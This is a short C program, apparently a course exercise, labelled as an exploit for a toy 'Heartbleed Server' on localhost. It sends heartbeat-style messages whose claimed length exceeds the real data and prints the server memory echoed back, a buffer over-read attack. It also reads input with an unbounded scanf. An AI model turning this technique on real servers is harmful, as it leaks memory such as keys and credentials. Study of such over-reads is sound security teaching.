// Travis lane
// Exploit for the Heartbleed Server


#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "net.h"
#include "buffer_over_read_message.h"

// http://stackoverflow.com/questions/17318886/fflush-is-not-working-in-linux
void clean_stdin(void)
{
    int c;
    do {
        c = getchar();
    } while (c != '\n' && c != EOF);
}

int main(void) 
{
	int rv;
	int client_socket = -1;

	// Initialize networking
	rv = net_init();
	if(rv != 0) {
		fprintf(stderr, "Failed to initialize networking.\n");
		goto out;
	}

	// Connect to the server
	// DON'T FORGET, THE SERVER NEEDS TO RUN FIRST.
	rv = socket_connect("localhost", "21012", &client_socket);
	if(rv != 0) {
		fprintf(stderr, "Failed to connect.\n");
		goto out;
	}
	printf("Connected!!\n");

	for(;;) // Forever
	{
		HeartbleedMessage *hm = NULL;
		char buff[2048] = "";
		int read = 0, sent = 0, msg_len, i, hm_size;

		// Prompt the user

		printf("Input message to echo: \n");
		scanf("%s", buff);

		printf("Input message length: \n");
		scanf( "%d", &msg_len);
		
		// Allocate space for our little message.
		hm_size = sizeof(HeartbleedMessage) + strlen(buff) + 1;
		hm = (HeartbleedMessage *) malloc(hm_size);
		hm->hm_len = msg_len;
		strcpy(hm->hm_data, buff);

		// Send the message
		sent = socket_send(client_socket, (const char *) hm, hm_size);
		if(sent <= 0) {
			fprintf(stderr, "Failed to send.\n");
			break;
		}

		// Free what we sents
		free(hm);

		// Recieve a (hopefully) large message from the server.
		read = socket_recv(client_socket, buff, sizeof(buff));
		if(read <= 0) {
			fprintf(stderr, "Failed to recv.\n");
			break;
		}

		// cast our message
		hm = (HeartbleedMessage *) buff;

		// Print what we got. >:)
		printf("Echo: ");
		for(i = 0; i < hm->hm_len && i < sizeof(buff); i++ ){
			putchar(hm->hm_data[i]);
		}
		printf("\n");
	}

	printf("Disconnected.\n");

out:
	socket_close(&client_socket);
	net_cleanup();
	return 0;
}
